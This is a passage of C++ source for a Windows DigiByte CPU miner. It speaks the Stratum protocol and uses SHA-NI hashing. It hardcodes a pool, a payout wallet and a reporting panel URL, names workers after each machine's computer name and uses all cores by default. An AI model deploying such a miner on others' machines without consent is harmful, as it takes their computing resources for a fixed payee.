#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>
#include <shellapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <immintrin.h>

#include <algorithm>
#include <atomic>
#include <cctype>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iomanip>
#include <map>
#include <random>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

namespace {

constexpr wchar_t kClass[] = L"DgbMinerAviso";
constexpr wchar_t kTitle[] = L"Minero DGB - aviso";
constexpr UINT kTrayMsg = WM_APP + 1;
constexpr UINT kIdTrayRestore = 1;
constexpr UINT kIdTrayStop = 2;
constexpr UINT kIdTrayExit = 3;
constexpr UINT kIdCheckbox = 4;
constexpr UINT kIdReload = 5;

constexpr wchar_t kEmbeddedPool[]   = L"stratum+tcp://bcmonster.com:9986";
constexpr wchar_t kEmbeddedWallet[] = L"DMQfxFM5MEU75Y1w1UdfYtW4wMaFx6dwRq";
constexpr wchar_t kEmbeddedServer[] = L"https://dgb-panel.dgb-panel-worker.workers.dev/report";
constexpr wchar_t kEmbeddedWorkerPrefix[] = L"pc_";

std::wstring machineWorker() {
    wchar_t name[MAX_COMPUTERNAME_LENGTH + 1]{};
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (!GetComputerNameW(name, &size) || size == 0) return L"worker01";
    return std::wstring(kEmbeddedWorkerPrefix) + name;
}

int autoThreads() {
    unsigned n = std::thread::hardware_concurrency();
    if (n == 0) n = 2;
    return std::min(64, std::max(1, static_cast<int>(n)));
}

void ensureConfig(const std::wstring& path) {
    if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) return;

    std::wstring data;
    data += L"[miner]\r\n";
    data += L"pool="   + std::wstring(kEmbeddedPool)   + L"\r\n";
    data += L"wallet=" + std::wstring(kEmbeddedWallet) + L"\r\n";
    data += L"worker=" + machineWorker()               + L"\r\n";
    data += L"threads=auto\r\n";
    data += L"server=" + std::wstring(kEmbeddedServer) + L"\r\n";

    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;

    DWORD written = 0;
    WriteFile(h, data.data(), static_cast<DWORD>(data.size() * sizeof(wchar_t)), &written, nullptr);
    CloseHandle(h);
}

std::wstring configPath() {
    wchar_t dir[MAX_PATH]{};
    GetModuleFileNameW(nullptr, dir, MAX_PATH);
    std::wstring p(dir);
    size_t slash = p.find_last_of(L"\\/");
    if (slash != std::wstring::npos) p = p.substr(0, slash + 1);
    std::wstring path = p + L"miner.cfg";
    ensureConfig(path);
    return path;
}

struct Config {
    std::wstring pool;
    std::wstring wallet;
    std::wstring worker;
    std::wstring server;
    int threads = 2;
};

std::wstring cfgStr(const wchar_t* key, const wchar_t* def) {
    wchar_t buf[2048]{};
    GetPrivateProfileStringW(L"miner", key, def, buf, 2048, configPath().c_str());
    return buf;
}

Config loadConfig() {
    Config c;
    c.pool   = cfgStr(L"pool",   kEmbeddedPool);
    c.wallet = cfgStr(L"wallet", kEmbeddedWallet);
    c.worker = cfgStr(L"worker", machineWorker().c_str());
    c.server = cfgStr(L"server", kEmbeddedServer);
    std::wstring ts = cfgStr(L"threads", L"auto");
    int autoN = autoThreads();
    if (ts == L"auto" || ts == L"0" || (_wtoi(ts.c_str()) == 2 && autoN > 2))
        c.threads = autoN;
    else
        c.threads = _wtoi(ts.c_str());
    if (c.threads < 1) c.threads = 1;
    if (c.threads > 64) c.threads = 64;
    return c;
}

// ---------------- SHA-256 ----------------

inline uint32_t ror(uint32_t x, int n) { return (x >> n) | (x << (32 - n)); }

bool cpuHasShaNi() {
    int regs[4]{};
    __cpuid(regs, 0);
    if (regs[0] < 7) return false;
    __cpuidex(regs, 7, 0);
    return (regs[1] & (1 << 29)) != 0;
}

static const uint32_t SHA_K[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

struct SHA256 {
    static constexpr uint32_t IV[8] = {
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
    };

    uint32_t h[8];
    uint8_t buf[64];
    size_t len = 0;
    uint64_t total = 0;

    SHA256() { reset(); }
    void reset() {
        std::memcpy(h, IV, sizeof(h));
        len = 0; total = 0;
    }

    static inline void compressShaNi(const uint32_t in[8], const uint8_t p[64], uint32_t out[8]) {
        __m128i state0, state1, msg, tmp;
        __m128i msg0, msg1, msg2, msg3;
        __m128i abefSave, cdghSave;
        const __m128i mask = _mm_set_epi64x(0x0c0d0e0f08090a0bULL, 0x0405060700010203ULL);

        tmp = _mm_loadu_si128(reinterpret_cast<const __m128i*>(&in[0]));
        state1 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(&in[4]));
        tmp = _mm_shuffle_epi32(tmp, 0xb1);
        state1 = _mm_shuffle_epi32(state1, 0x1b);
        state0 = _mm_alignr_epi8(tmp, state1, 8);
        state1 = _mm_blend_epi16(state1, tmp, 0xf0);

        abefSave = state0;
        cdghSave = state1;

        msg = _mm_loadu_si128(reinterpret_cast<const __m128i*>(p + 0));
        msg0 = _mm_shuffle_epi8(msg, mask);
        msg = _mm_add_epi32(msg0, _mm_set_epi64x(0xe9b5dba5b5c0fbcfULL, 0x71374491428a2f98ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);

        msg1 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(p + 16));
        msg1 = _mm_shuffle_epi8(msg1, mask);
        msg = _mm_add_epi32(msg1, _mm_set_epi64x(0xab1c5ed5923f82a4ULL, 0x59f111f13956c25bULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg0 = _mm_sha256msg1_epu32(msg0, msg1);

        msg2 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(p + 32));
        msg2 = _mm_shuffle_epi8(msg2, mask);
        msg = _mm_add_epi32(msg2, _mm_set_epi64x(0x550c7dc3243185beULL, 0x12835b01d807aa98ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg1 = _mm_sha256msg1_epu32(msg1, msg2);

        msg3 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(p + 48));
        msg3 = _mm_shuffle_epi8(msg3, mask);
        msg = _mm_add_epi32(msg3, _mm_set_epi64x(0xc19bf1749bdc06a7ULL, 0x80deb1fe72be5d74ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg3, msg2, 4);
        msg0 = _mm_add_epi32(msg0, tmp);
        msg0 = _mm_sha256msg2_epu32(msg0, msg3);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg2 = _mm_sha256msg1_epu32(msg2, msg3);

        msg = _mm_add_epi32(msg0, _mm_set_epi64x(0x240ca1cc0fc19dc6ULL, 0xefbe4786e49b69c1ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg0, msg3, 4);
        msg1 = _mm_add_epi32(msg1, tmp);
        msg1 = _mm_sha256msg2_epu32(msg1, msg0);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg3 = _mm_sha256msg1_epu32(msg3, msg0);

        msg = _mm_add_epi32(msg1, _mm_set_epi64x(0x76f988da5cb0a9dcULL, 0x4a7484aa2de92c6fULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg1, msg0, 4);
        msg2 = _mm_add_epi32(msg2, tmp);
        msg2 = _mm_sha256msg2_epu32(msg2, msg1);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg0 = _mm_sha256msg1_epu32(msg0, msg1);

        msg = _mm_add_epi32(msg2, _mm_set_epi64x(0xbf597fc7b00327c8ULL, 0xa831c66d983e5152ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg2, msg1, 4);
        msg3 = _mm_add_epi32(msg3, tmp);
        msg3 = _mm_sha256msg2_epu32(msg3, msg2);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg1 = _mm_sha256msg1_epu32(msg1, msg2);

        msg = _mm_add_epi32(msg3, _mm_set_epi64x(0x1429296706ca6351ULL, 0xd5a79147c6e00bf3ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg3, msg2, 4);
        msg0 = _mm_add_epi32(msg0, tmp);
        msg0 = _mm_sha256msg2_epu32(msg0, msg3);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg2 = _mm_sha256msg1_epu32(msg2, msg3);

        msg = _mm_add_epi32(msg0, _mm_set_epi64x(0x53380d134d2c6dfcULL, 0x2e1b213827b70a85ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg0, msg3, 4);
        msg1 = _mm_add_epi32(msg1, tmp);
        msg1 = _mm_sha256msg2_epu32(msg1, msg0);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg3 = _mm_sha256msg1_epu32(msg3, msg0);

        msg = _mm_add_epi32(msg1, _mm_set_epi64x(0x92722c8581c2c92eULL, 0x766a0abb650a7354ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg1, msg0, 4);
        msg2 = _mm_add_epi32(msg2, tmp);
        msg2 = _mm_sha256msg2_epu32(msg2, msg1);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg0 = _mm_sha256msg1_epu32(msg0, msg1);

        msg = _mm_add_epi32(msg2, _mm_set_epi64x(0xc76c51a3c24b8b70ULL, 0xa81a664ba2bfe8a1ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg2, msg1, 4);
        msg3 = _mm_add_epi32(msg3, tmp);
        msg3 = _mm_sha256msg2_epu32(msg3, msg2);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg1 = _mm_sha256msg1_epu32(msg1, msg2);

        msg = _mm_add_epi32(msg3, _mm_set_epi64x(0x106aa070f40e3585ULL, 0xd6990624d192e819ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg3, msg2, 4);
        msg0 = _mm_add_epi32(msg0, tmp);
        msg0 = _mm_sha256msg2_epu32(msg0, msg3);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg2 = _mm_sha256msg1_epu32(msg2, msg3);

        msg = _mm_add_epi32(msg0, _mm_set_epi64x(0x34b0bcb52748774cULL, 0x1e376c0819a4c116ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg0, msg3, 4);
        msg1 = _mm_add_epi32(msg1, tmp);
        msg1 = _mm_sha256msg2_epu32(msg1, msg0);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);
        msg3 = _mm_sha256msg1_epu32(msg3, msg0);

        msg = _mm_add_epi32(msg1, _mm_set_epi64x(0x682e6ff35b9cca4fULL, 0x4ed8aa4a391c0cb3ULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg1, msg0, 4);
        msg2 = _mm_add_epi32(msg2, tmp);
        msg2 = _mm_sha256msg2_epu32(msg2, msg1);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);

        msg = _mm_add_epi32(msg2, _mm_set_epi64x(0x8cc7020884c87814ULL, 0x78a5636f748f82eeULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        tmp = _mm_alignr_epi8(msg2, msg1, 4);
        msg3 = _mm_add_epi32(msg3, tmp);
        msg3 = _mm_sha256msg2_epu32(msg3, msg2);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);

        msg = _mm_add_epi32(msg3, _mm_set_epi64x(0xc67178f2bef9a3f7ULL, 0xa4506ceb90befffaULL));
        state1 = _mm_sha256rnds2_epu32(state1, state0, msg);
        msg = _mm_shuffle_epi32(msg, 0x0e);
        state0 = _mm_sha256rnds2_epu32(state0, state1, msg);

        state0 = _mm_add_epi32(state0, abefSave);
        state1 = _mm_add_epi32(state1, cdghSave);

        tmp = _mm_shuffle_epi32(state0, 0x1b);
        state1 = _mm_shuffle_epi32(state1, 0xb1);
        state0 = _mm_blend_epi16(tmp, state1, 0xf0);
        state1 = _mm_alignr_epi8(state1, tmp, 8);

        _mm_storeu_si128(reinterpret_cast<__m128i*>(&out[0]), state0);
        _mm_storeu_si128(reinterpret_cast<__m128i*>(&out[4]), state1);
    }

    static inline void compress(const uint32_t in[8], const uint8_t p[64], uint32_t out[8]) {
        static const bool useShaNi = cpuHasShaNi();
        if (useShaNi) compressShaNi(in, p, out);
        else compressScalar(in, p, out);
    }

    static inline void compressScalar(const uint32_t in[8], const uint8_t p[64], uint32_t out[8]) {
        uint32_t w[64];
        for (int i = 0; i < 16; ++i)
            w[i] = (uint32_t(p[4*i])<<24) | (uint32_t(p[4*i+1])<<16) |
                   (uint32_t(p[4*i+2])<<8)  | uint32_t(p[4*i+3]);
        for (int i = 16; i < 64; ++i) {
            uint32_t s0 = ror(w[i-15],7) ^ ror(w[i-15],18) ^ (w[i-15] >> 3);
            uint32_t s1 = ror(w[i-2],17) ^ ror(w[i-2],19) ^ (w[i-2] >> 10);
            w[i] = w[i-16] + s0 + w[i-7] + s1;
        }
        uint32_t a=in[0],b=in[1],c=in[2],d=in[3],e=in[4],f=in[5],g=in[6],hh=in[7];
        for (int i = 0; i < 64; ++i) {
            uint32_t S1 = ror(e,6) ^ ror(e,11) ^ ror(e,25);
            uint32_t ch = (e & f) ^ (~e & g);
            uint32_t t1 = hh + S1 + ch + SHA_K[i] + w[i];
            uint32_t S0 = ror(a,2) ^ ror(a,13) ^ ror(a,22);
            uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
            uint32_t t2 = S0 + maj;
            hh=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
        }
        out[0]=in[0]+a; out[1]=in[1]+b; out[2]=in[2]+c; out[3]=in[3]+d;
        out[4]=in[4]+e; out[5]=in[5]+f; out[6]=in[6]+g; out[7]=in[7]+hh;
    }

    void block(const uint8_t* p) { compress(h, p, h); }
    void update(const void* data, size_t n) {
        const uint8_t* p = static_cast<const uint8_t*>(data);
        total += n;
        while (n) {
            size_t take = 64 - len;
            if (take > n) take = n;
            std::memcpy(buf + len, p, take);
            len += take; p += take; n -= take;
            if (len == 64) { block(buf); len = 0; }
        }
    }
    void final(uint8_t out[32]) {
        uint64_t bits = total * 8;
        uint8_t one = 0x80; update(&one, 1);
        uint8_t zero = 0;
        while (len != 56) update(&zero, 1);
        uint8_t tail[8];
        for (int i = 0; i < 8; ++i) tail[i] = uint8_t(bits >> (56 - 8*i));
        update(tail, 8);
        for (int i = 0; i < 8; ++i) {
            out[4*i]   = uint8_t(h[i] >> 24);
            out[4*i+1] = uint8_t(h[i] >> 16);
            out[4*i+2] = uint8_t(h[i] >> 8);
            out[4*i+3] = uint8_t(h[i]);
        }
    }
    static void hash(const void* d, size_t n, uint8_t out[32]) { SHA256 s; s.update(d, n); s.final(out); }
    static void dhash(const void* d, size_t n, uint8_t out[32]) {
        uint8_t t[32]; hash(d, n, t); hash(t, 32, out);
    }
};

// ---------------- hex ----------------

std::vector<uint8_t> unhex(const std::string& s) {
    std::vector<uint8_t> out;
    out.reserve(s.size() / 2);
    auto nib = [](char c) -> int {
        if (c >= '0' && c <= '9') return c - '0';
        c = char(std::tolower(static_cast<unsigned char>(c)));
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        return -1;
    };
    for (size_t i = 0; i + 1 < s.size(); i += 2) {
        int a = nib(s[i]), b = nib(s[i+1]);
        if (a < 0 || b < 0) break;
        out.push_back(uint8_t((a << 4) | b));
    }
    return out;
}

std::string hexOf(const uint8_t* p, size_t n) {
    static const char* d = "0123456789abcdef";
    std::string s; s.reserve(n * 2);
    for (size_t i = 0; i < n; ++i) { s += d[p[i] >> 4]; s += d[p[i] & 15]; }
    return s;
}

std::string wideToUtf8(const std::wstring& w) {
    int n = WideCharToMultiByte(CP_UTF8, 0, w.data(), int(w.size()), nullptr, 0, nullptr, nullptr);
    std::string s(size_t(n > 0 ? n : 0), '\0');
    if (n > 0) WideCharToMultiByte(CP_UTF8, 0, w.data(), int(w.size()), s.data(), n, nullptr, nullptr);
    return s;
}

std::string jsonEscape(const std::string& s) {
    std::string o;
    for (unsigned char c : s) {
        switch (c) {
            case '\\': o += "\\\\"; break;
            case '"':  o += "\\\""; break;
            case '\n': o += "\\n"; break;
            case '\r': o += "\\r"; break;
            case '\t': o += "\\t"; break;
            default:
                if (c < 0x20) {
                    char b[8]; std::snprintf(b, sizeof(b), "\\u%04x", c); o += b;
                } else o += char(c);
        }
    }
    return o;
}

// ---------------- minimal JSON ----------------

struct JVal {
    enum T { Null, Bool, Num, Str, Arr, Obj } t = Null;
    bool b = false;
    double num = 0;
    std::string s;
    std::vector<JVal> a;
    std::map<std::string, JVal> o;
    const JVal* get(const char* k) const {
        if (t != Obj) return nullptr;
        auto it = o.find(k);
        return it == o.end() ? nullptr : &it->second;
    }
    const JVal* at(size_t i) const { return (t == Arr && i < a.size()) ? &a[i] : nullptr; }
    std::string str() const { return t == Str ? s : std::string(); }
    double number() const { return t == Num ? num : 0; }
};

struct JParser {
    const std::string& src;
    size_t p = 0;
    explicit JParser(const std::string& s) : src(s) {}
    void ws() { while (p < src.size() && std::isspace(static_cast<unsigned char>(src[p]))) ++p; }
    bool pstr(std::string& out) {
        if (p >= src.size() || src[p] != '"') return false;
        ++p; out.clear();
        while (p < src.size()) {
            char c = src[p++];
            if (c == '"') return true;
            if (c == '\\') {
                if (p >= src.size()) return false;
                char e = src[p++];
                switch (e) {
                    case 'n': out += '\n'; break;
                    case 'r': out += '\r'; break;
                    case 't': out += '\t'; break;
                    case 'b': out += '\b'; break;
                    case 'f': out += '\f'; break;
                    case '"': out += '"'; break;
                    case '\\': out += '\\'; break;
                    case '/': out += '/'; break;
                    case 'u': {
                        if (p + 4 > src.size()) return false;
                        unsigned cp = 0;
                        for (int i = 0; i < 4; ++i) {
                            char h = src[p++];
                            cp = cp * 16 + (h >= '0' && h <= '9' ? h - '0' : ((h | 32) - 'a' + 10));
                        }
                        out += (cp < 0x80) ? char(cp) : '?';
                        break;
                    }
                    default: out += e;
                }
            } else out += c;
        }
        return false;
    }
    bool parse(JVal& v) {
        ws();
        if (p >= src.size()) return false;
        char c = src[p];
        if (c == '{') {
            v.t = JVal::Obj; ++p; ws();
            if (p < src.size() && src[p] == '}') { ++p; return true; }
            while (p < src.size()) {
                ws(); std::string k;
                if (!pstr(k)) return false;
                ws();
                if (p >= src.size() || src[p] != ':') return false;
                ++p;
                JVal child;
                if (!parse(child)) return false;
                v.o[k] = child;
                ws();
                if (p < src.size() && src[p] == ',') { ++p; continue; }
                if (p < src.size() && src[p] == '}') { ++p; return true; }
                return false;
            }
            return false;
        }
        if (c == '[') {
            v.t = JVal::Arr; ++p; ws();
            if (p < src.size() && src[p] == ']') { ++p; return true; }
            while (p < src.size()) {
                JVal child;
                if (!parse(child)) return false;
                v.a.push_back(child);
                ws();
                if (p < src.size() && src[p] == ',') { ++p; continue; }
                if (p < src.size() && src[p] == ']') { ++p; return true; }
                return false;
            }
            return false;
        }
        if (c == '"') { v.t = JVal::Str; return pstr(v.s); }
        if (c == 't') { v.t = JVal::Bool; v.b = true;  if (src.compare(p,4,"true")  != 0) return false; p += 4; return true; }
        if (c == 'f') { v.t = JVal::Bool; v.b = false; if (src.compare(p,5,"false") != 0) return false; p += 5; return true; }
        if (c == 'n') { v.t = JVal::Null;             if (src.compare(p,4,"null")  != 0) return false; p += 4; return true; }
        size_t st = p;
        if (p < src.size() && (src[p] == '-' || src[p] == '+')) ++p;
        while (p < src.size() && (std::isdigit(static_cast<unsigned char>(src[p])) ||
               src[p]=='.' || src[p]=='e' || src[p]=='E' || src[p]=='+' || src[p]=='-')) ++p;
        if (st == p) return false;
        v.t = JVal::Num;
        v.num = std::strtod(src.substr(st, p-st).c_str(), nullptr);
        return true;
    }
};

bool parseJson(const std::string& s, JVal& out) { JParser p(s); return p.parse(out); }

// ---------------- Stratum worker ----------------

class Worker {
public:
    std::atomic<bool> stop{false};
    std::atomic<uint64_t> hashes{0};
    std::atomic<uint64_t> accepted{0};
    std::atomic<uint64_t> rejected{0};

    Worker(int idx, const Config& c) : index(idx) {
        cfg = c;
        std::wstring wpool = c.pool;
        size_t scheme = wpool.find(L"://");
        std::wstring addr = scheme == std::wstring::npos ? wpool : wpool.substr(scheme + 3);
        size_t colon = addr.rfind(L':');
        if (colon != std::wstring::npos) {
            host = wideToUtf8(addr.substr(0, colon));
            port = wideToUtf8(addr.substr(colon + 1));
        } else {
            host = wideToUtf8(addr);
            port = "3333";
        }
        user = wideToUtf8(c.wallet) + "." + wideToUtf8(c.worker);
    }

    void run() {
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_ABOVE_NORMAL);
        dbg("worker start");
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
        std::random_device rd;
        std::mt19937 rng(rd());
        uint32_t nonce = rng();
        while (!stop) {
            if (!connect()) { dbg("connect failed: " + host + ":" + port); sleepMs(3000); continue; }
            dbg("connected " + host + ":" + port + " user=" + user);
            if (!rpc(1, "mining.subscribe", "[\"DgbCpuMiner/1.0\"]") || !subscribeOk) {
                dbg("subscribe failed");
                closesocket(sock); sock = INVALID_SOCKET; sleepMs(3000); continue;
            }
            dbg("subscribe ok ex1size=" + std::to_string(ex1.size()) + " ex2size=" + std::to_string(ex2size));
            if (!rpc(2, "mining.authorize", "[\"" + jsonEscape(user) + "\",\"x\"]") || !authOk) {
                dbg("authorize failed");
                closesocket(sock); sock = INVALID_SOCKET; sleepMs(5000); continue;
            }
            dbg("authorized");
            while (!stop && sock != INVALID_SOCKET) {
                pumpMessages();
                if (haveJob) mineOne(nonce, rng);
                else sleepMs(20);
                if (++idleTicks > 20000) { idleTicks = 0; closesocket(sock); sock = INVALID_SOCKET; }
            }
            if (sock != INVALID_SOCKET) { closesocket(sock); sock = INVALID_SOCKET; }
            sleepMs(2000);
        }
        WSACleanup();
    }

private:
    int index;
    Config cfg;
    std::string host, port, user;
    SOCKET sock = INVALID_SOCKET;
    std::string inBuf;
    uint32_t msgId = 10;
    bool subscribeOk = false, authOk = false, haveJob = false;
    int idleTicks = 0;
    double diff = 1.0;
    uint8_t target[32]{};
    uint32_t targetW[8]{};

    std::string jobId, ntimeHex;
    std::vector<uint8_t> cb1, cb2, verB, prevB, nbB, ntB;
    std::vector<std::vector<uint8_t>> merkle;
    std::vector<uint8_t> ex1, ex2;
    std::string ex2Hex;

    static void sleepMs(int ms) { std::this_thread::sleep_for(std::chrono::milliseconds(ms)); }

    void dbg(const std::string& what) {
        wchar_t dir[MAX_PATH]{};
        GetModuleFileNameW(nullptr, dir, MAX_PATH);
        std::wstring p(dir);
        size_t slash = p.find_last_of(L"\\/");
        if (slash != std::wstring::npos) p = p.substr(0, slash + 1);
        p += L"miner_debug.log";
        if (FILE* f = _wfopen(p.c_str(), L"ab")) {
            char line[1024];
            std::snprintf(line, sizeof(line), "[%d] %s\n", index, what.c_str());
            std::fwrite(line, 1, std::strlen(line), f);
            std::fclose(f);
        }
    }

    bool connect() {
        addrinfo hints{};
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        addrinfo* res = nullptr;
        if (getaddrinfo(host.c_str(), port.c_str(), &hints, &res) != 0 || !res) return false;
        SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (s == INVALID_SOCKET) { freeaddrinfo(res); return false; }
        if (::connect(s, res->ai_addr, int(res->ai_addrlen)) != 0) {
            closesocket(s); freeaddrinfo(res); return false;
        }
        freeaddrinfo(res);
        sock = s;
        inBuf.clear();
        subscribeOk = authOk = haveJob = false;
        return true;
    }

    void sendLine(const std::string& line) {
        if (sock == INVALID_SOCKET) return;
        std::string data = line + "\n";
        size_t sent = 0;
        while (sent < data.size()) {
            int r = ::send(sock, data.data() + sent, int(data.size() - sent), 0);
            if (r <= 0) { closesocket(sock); sock = INVALID_SOCKET; return; }
            sent += size_t(r);
        }
    }

    void rpcSend(uint32_t id, const std::string& method, const std::string& params) {
        char b[32];
        std::snprintf(b, sizeof(b), "%u", id);
        sendLine(std::string("{\"id\":") + b + ",\"method\":\"" + method + "\",\"params\":" + params + "}");
    }

    bool rpc(uint32_t id, const std::string& method, const std::string& params) {
        rpcSend(id, method, params);
        std::string line;
        while (sock != INVALID_SOCKET && readLine(line, 250)) {
            handle(line);
            JVal j;
            if (parseJson(line, j)) {
                const JVal* v = j.get("id");
                if (v && uint64_t(v->number()) == id) return true;
            }
        }
        return false;
    }

    bool readLine(std::string& line, int timeoutMs) {
        // Los pools pueden mandar varias lineas en un solo recv; agotar el
        // buffer antes de mirar el socket evita perder la respuesta de authorize.
        size_t pos = inBuf.find('\n');
        if (pos == std::string::npos) {
            if (sock == INVALID_SOCKET) return false;
            fd_set rd; FD_ZERO(&rd); FD_SET(sock, &rd);
            timeval tv; tv.tv_sec = timeoutMs / 1000; tv.tv_usec = (timeoutMs % 1000) * 1000;
            int r = select(0, &rd, nullptr, nullptr, &tv);
            if (r <= 0) return false;
            char buf[16384];
            int n = ::recv(sock, buf, sizeof(buf), 0);
            if (n <= 0) { closesocket(sock); sock = INVALID_SOCKET; return false; }
            inBuf.append(buf, size_t(n));
            pos = inBuf.find('\n');
            if (pos == std::string::npos) return false;
        }
        line = inBuf.substr(0, pos);
        inBuf.erase(0, pos + 1);
        if (!line.empty() && line.back() == '\r') line.pop_back();
        return true;
    }

    void handle(const std::string& line) {
        JVal j;
        if (!parseJson(line, j)) return;
        if (const JVal* m = j.get("method")) {
            std::string method = m->str();
            const JVal* params = j.get("params");
            if (method == "mining.notify" && params && params->t == JVal::Arr) {
                jobId  = params->at(0) ? params->at(0)->str() : "";
                std::string ph = params->at(1) ? params->at(1)->str() : "";
                std::string c1 = params->at(2) ? params->at(2)->str() : "";
                std::string c2 = params->at(3) ? params->at(3)->str() : "";
                const JVal* br = params->at(4);
                std::string vb = params->at(5) ? params->at(5)->str() : "";
                std::string nb = params->at(6) ? params->at(6)->str() : "";
                ntimeHex       = params->at(7) ? params->at(7)->str() : "";
                prevB = unhex(ph); cb1 = unhex(c1); cb2 = unhex(c2);
                verB = unhex(vb); nbB = unhex(nb); ntB = unhex(ntimeHex);
                merkle.clear();
                if (br && br->t == JVal::Arr)
                    for (const JVal& b : br->a) merkle.push_back(unhex(b.str()));
                std::random_device rd; std::mt19937 rng(rd());
                ex2.assign(size_t(ex2.size() ? ex2.size() : 4), 0);
                for (auto& x : ex2) x = uint8_t(rng() & 0xff);
                ex2Hex = hexOf(ex2.data(), ex2.size());
                haveJob = prevB.size() == 32 && verB.size() == 4 && ntB.size() == 4 && nbB.size() == 4;
                dbg("job " + jobId + " haveJob=" + std::to_string(haveJob) +
                    " sizes=" + std::to_string(prevB.size()) + "/" + std::to_string(verB.size()) +
